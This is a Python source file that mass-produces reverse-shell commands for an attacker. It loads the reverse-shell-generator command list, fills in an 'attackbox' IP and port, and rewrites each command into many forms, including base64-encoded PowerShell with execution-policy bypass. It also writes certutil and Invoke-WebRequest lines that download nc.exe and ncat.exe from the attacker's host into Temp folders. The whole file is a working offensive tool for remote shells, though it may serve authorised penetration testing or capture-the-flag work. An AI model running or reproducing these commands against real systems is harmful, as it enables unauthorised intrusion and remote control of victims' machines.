import base64
import requests
import STPyV8

WINDOWS_SHELLS = ["powershell.exe", "powershell", "cmd.exe", "cmd"]

def emit_shells(command: str, shells: list):
    if "{shell}" not in command:
        yield command
        return

    for s in shells:
        yield command.replace("{shell}", s)

def linux_rewrites(command_unshelled: str, shells: list):
    for command in emit_shells(command_unshelled, shells):
        yield command

        yield f"bash -c '{command}'"
        yield f'bash -c "{command}"'

def windows_download_tools(attackbox_ip: str, attackbox_web_port: int):
    for tool in ["nc.exe", "ncat.exe"]: # Download tools to ., %localappdata%\\Temp\\, and C:\\Windows\\Temp\\
        yield f"certutil.exe -urlcache -f http://{attackbox_ip}:{attackbox_web_port}/{tool} {tool}"
        yield f"certutil.exe -urlcache -f http://{attackbox_ip}:{attackbox_web_port}/{tool} %localappdata%\\Temp\\{tool}"
        yield f"certutil.exe -urlcache -f http://{attackbox_ip}:{attackbox_web_port}/{tool} C:\\Windows\\Temp\\{tool}"

        yield f"powershell.exe -ep bypass -c 'Invoke-WebRequest http://{attackbox_ip}:{attackbox_web_port}/{tool} -OutFile {tool} -UseBasicParsing'"
        yield f'powershell.exe -ep bypass -c "Invoke-WebRequest http://{attackbox_ip}:{attackbox_web_port}/{tool} -OutFile {tool} -UseBasicParsing"'
        
        yield f"powershell.exe -ep bypass -c 'Invoke-WebRequest http://{attackbox_ip}:{attackbox_web_port}/{tool} -OutFile $env:LOCALAPPDATA\\Temp\\{tool} -UseBasicParsing'"
        yield f'powershell.exe -ep bypass -c "Invoke-WebRequest http://{attackbox_ip}:{attackbox_web_port}/{tool} -OutFile $env:LOCALAPPDATA\\Temp\\{tool} -UseBasicParsing"'

        yield f"powershell.exe -ep bypass -c 'Invoke-WebRequest http://{attackbox_ip}:{attackbox_web_port}/{tool} -OutFile C:\\Windows\\Temp\\{tool} -UseBasicParsing'"
        yield f'powershell.exe -ep bypass -c "Invoke-WebRequest http://{attackbox_ip}:{attackbox_web_port}/{tool} -OutFile C:\\Windows\\Temp\\{tool} -UseBasicParsing"'

def windows_rewrites(command_unshelled: str, shells: list, attackbox_ip: str, attackbox_web_port: int):
    for command in emit_shells(command_unshelled, shells):
        conPtyUrl = "https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1"
        if conPtyUrl in command: # Rewrite ConPtyShell url to attackbox IP from local network
            command = command.replace(conPtyUrl, f"http://{attackbox_ip}:{attackbox_web_port}/Invoke-ConPtyShell.ps1")

        yield command

        yield f"powershell.exe -ep bypass -c '{command}'"
        yield f'powershell.exe -ep bypass -c "{command}"'
        yield f"powershell.exe -ep bypass -e {base64.b64encode(command.encode('utf-16le')).decode('utf-8')}"

        if command.startswith("nc.exe") or command.startswith("ncat.exe"):
            yield f"%localappdata%\\Temp\\{command}"
            yield f'powershell.exe -ep bypass -c ". $env:LOCALAPPDATA\\Temp\\{command}"'
            yield f"powershell.exe -ep bypass -c '. $env:LOCALAPPDATA\\Temp\\{command}'"
            yield f"powershell.exe -ep bypass -e {base64.b64encode(f". $env:LOCALAPPDATA\\Temp\\{command}".encode('utf-16le')).decode('utf-8')}"

            yield f"C:\\Windows\\Temp\\{command}"
            yield f'powershell.exe -ep bypass -c ". C:\\Windows\\Temp\\{command}"'
            yield f"powershell.exe -ep bypass -c '. C:\\Windows\\Temp\\{command}'"
            yield f"powershell.exe -ep bypass -e {base64.b64encode(f". C:\\Windows\\Temp\\{command}".encode('utf-16le')).decode('utf-8')}"

def get_revshells(attackbox_ip: str, attackbox_port: int, attackbox_web_port: int, os: str):
    resp = requests.get("https://raw.githubusercontent.com/0dayCTF/reverse-shell-generator/refs/heads/main/js/data.js")

    include_os = os
    exclude_os = "linux" if include_os == "windows" else ("windows" if include_os == "linux" else "_")

    commands = []
    with STPyV8.JSContext() as ctxt:
        ctxt.eval(resp.text) # Load JS
        commands = ctxt.eval(f"""
            reverseShellCommands.reduce((revshells, cmd) => {{
                if (cmd['meta'].includes("{include_os}") && !cmd['meta'].includes("{exclude_os}")) {{
                    revshells.push(cmd['command']);
                }}
                return revshells;
            }}, [])""")
        
        shells = WINDOWS_SHELLS if include_os == "windows" else [s for s in ctxt.eval("rsgData['shells']") if s not in WINDOWS_SHELLS]

        if os == "windows":
            yield from windows_download_tools(attackbox_ip, attackbox_web_port)

        for c in commands:
            c = c.replace("{ip}", attackbox_ip).replace("{port}", f"{attackbox_port}")

            if "\n" in c or "<?php" in c:
                continue
            
            if os == "windows":
                yield from windows_rewrites(c, shells, attackbox_ip, attackbox_web_port)
            elif os == "linux":
                yield from linux_rewrites(c, shells)
            else:
                yield from emit_shells(c, shells)